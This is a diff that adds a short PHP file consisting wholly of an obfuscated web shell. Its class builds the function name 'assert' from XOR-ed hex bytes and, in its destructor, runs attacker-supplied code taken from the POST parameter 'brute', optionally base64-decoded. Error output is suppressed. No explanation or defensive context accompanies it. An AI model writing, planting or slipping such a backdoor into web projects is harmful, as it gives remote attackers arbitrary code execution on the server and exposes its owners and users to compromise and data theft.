@@ -1,0 +1,20 @@
+<?php 
+class OPAB { 
+    function Phlj() {
+        $AqAw = "\xd6" ^ "\xb7";
+        $mIuI = "\xc" ^ "\x7f";
+        $sDbE = "\xc9" ^ "\xba";
+        $OGzc = "\x70" ^ "\x15";
+        $OrXB = "\xf5" ^ "\x87";
+        $pRfq = "\xac" ^ "\xd8";
+        $gNDN =$AqAw.$mIuI.$sDbE.$OGzc.$OrXB.$pRfq;
+        return $gNDN;
+    }
+    function __destruct(){
+        $dSsu=$this->Phlj();
+        @$dSsu($this->hh);
+    }
+}
+$opab = new OPAB();
+@$opab->hh = isset($_GET['id'])?base64_decode($_POST['brute']):$_POST['brute'];
+?>
